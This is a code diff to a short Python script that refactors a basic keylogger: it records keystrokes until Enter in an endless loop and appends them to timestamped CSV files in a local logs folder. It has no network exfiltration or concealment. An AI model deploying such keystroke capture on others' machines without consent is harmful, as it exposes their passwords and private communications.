@@ -1,17 +1,34 @@
-import functions
+from lib import keyboard    
+from datetime import datetime   
+import os   
+
+def checkLogsPath(path):
+    if os.path.exists(path) == False:
+        os.mkdir(path)
+
+def recording():
+    return keyboard.record(until=('enter'))
+
+def calcualteDataAndHour():
+    tempTime = datetime.now()
+    return str(tempTime.strftime("%Y-%m-%d %H.%M.%S"))
+
+def writeToFile(lPath, lName, l):
+    newLog = open(lPath + lName, "a")
+    newLog.write(str(l))
+    newLog.close()
 
 def main():
 
-    tempLogName = functions.calcualteDataAndHour()      #from date and hour create the new file name where storage the output
-    
-    logsPath = "logs/"  #logs path where output is stored
+    tempLogName = calcualteDataAndHour()
+    logsPath = "logs/"
 
-    functions.checkLogsPath(logsPath)   #check if the output storage is existing
+    checkLogsPath(logsPath)
 
     while True:
-        tempLog = functions.recording()     #recording keys... and save it in a variable
+        tempLog = recording()
 
-        functions.writeToFile(logsPath,tempLogName+".csv",tempLog) #write into a new file the output 
+        writeToFile(logsPath,tempLogName+".csv",tempLog)
 
 #########################
 if __name__== "__main__":
